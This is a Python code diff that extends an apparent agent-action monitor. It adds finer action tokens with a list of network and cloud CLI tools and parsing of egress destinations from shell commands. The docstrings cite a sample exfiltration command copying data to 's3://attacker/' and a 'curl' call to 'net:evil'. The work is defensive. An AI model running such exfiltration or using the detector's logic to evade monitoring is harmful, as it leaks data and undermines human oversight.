@@ -111,6 +111,110 @@ def action_token(action: Action) -> str:
     return f"{action.verb}|{action.tool}|{resource_class(action.resource)}"
 
 
+_CLOUD_NET_HEADS = frozenset({
+    "aws", "gsutil", "gcloud", "az", "rclone", "curl", "wget", "nc", "ncat",
+    "ssh", "scp", "sftp", "rsync", "ftp", "http", "https",
+})
+
+
+def command_head(action: Action) -> str:
+    """First argv of a shell command, else empty."""
+    if action.tool not in {"Bash", "bash", "shell", "terminal"}:
+        return ""
+    command = str(action.args.get("command") or "")
+    if not command:
+        return ""
+    import shlex
+    try:
+        parts = shlex.split(command)
+    except ValueError:
+        parts = command.split()
+    # Skip env assignments and sudo-style prefixes.
+    while parts and ("=" in parts[0] and not parts[0].startswith("-")):
+        parts = parts[1:]
+    while parts and parts[0].rstrip("/").split("/")[-1] in {"sudo", "env", "time", "nohup", "exec", "command"}:
+        parts = parts[1:]
+    if not parts:
+        return ""
+    from pathlib import PurePosixPath
+    return PurePosixPath(parts[0]).name
+
+
+def egress_hint_from_command(command: str, head: str) -> str:
+    """Object-store / URL destination for a network CLI, else empty.
+
+    Only when ``head`` is a real network/cloud binary — never for ``sed``/``awk``
+    that merely mention a URL inside a rewrite script.
+    """
+    import re
+    from urllib.parse import urlparse
+
+    if head not in _CLOUD_NET_HEADS or not command:
+        return ""
+    m = re.search(r"(?P<scheme>s3|gs)://(?P<bucket>[a-z0-9.\-_]+)", command, re.I)
+    if m and head in {"aws", "gsutil", "gcloud", "rclone", "az"}:
+        return f"net:{m.group('scheme').lower()}:{m.group('bucket')}"
+    m = re.search(r"((?:s3|gs|azure|az|https?|ftp)://[^\s'\"\\]+)", command, re.I)
+    if not m:
+        return ""
+    uri = m.group(1)
+    lower = uri.lower()
+    if lower.startswith(("s3://", "gs://", "azure://", "az://")):
+        scheme, rest = uri.split("://", 1)
+        bucket = rest.split("/", 1)[0]
+        return f"net:{scheme.lower()}:{bucket}"
+    host = urlparse(uri).hostname
+    return f"net:{host}" if host else ""
+
+
+def path_hint(action: Action) -> str:
+    """Filesystem / egress target (meta, args, or cloud-CLI destination).
+
+    For Bash cloud CLIs, prefers ``s3://`` / ``gs://`` / URL destinations over a
+    local source path the loader may have recorded alone — otherwise weight
+    exfil via ``aws s3 cp /data/... s3://attacker/`` looks in-surface.
+    """
+    head = command_head(action)
+    cloud = egress_hint_from_command(str(action.args.get("command") or ""), head)
+    meta = action.meta or {}
+    for key in ("path", "target", "destination"):
+        val = meta.get(key)
+        if isinstance(val, str) and val:
+            if cloud and not val.startswith("net:"):
+                return cloud
+            return val
+    for key in ("file_path", "path", "notebook_path", "url", "to", "destination"):
+        val = action.args.get(key)
+        if isinstance(val, str) and val:
+            return val
+    return cloud
+
+
+def surface_token(action: Action) -> str:
+    """Path / host leaf used by the fine token vocabulary."""
+    import posixpath
+
+    hint = path_hint(action)
+    if not hint:
+        return "none"
+    if hint.startswith("net:"):
+        return hint
+    base = posixpath.basename(hint.rstrip("/")) or hint
+    if "." in base and not base.startswith("."):
+        return base.rsplit(".", 1)[-1]  # extension class
+    return base[:24] or "path"
+
+
+def fine_action_token(action: Action) -> str:
+    """``verb|tool|cmd_head|surface`` — finer than ``action_token`` for twin corridors.
+
+    Still metadata-only (no free-text body). Distinguishes ``Bash|curl|net:evil``
+    from ``Bash|ls|py`` where the coarse token collapses both to ``execute|Bash|workspace``.
+    """
+    head = command_head(action) or "-"
+    return f"{action.verb}|{action.tool}|{head}|{surface_token(action)}"
+
+
 def goal_tokens(goal: GoalSpec) -> list[str]:
     """Content tokens describing the sealed goal, used to condition scoring."""
     tokens: list[str] = []
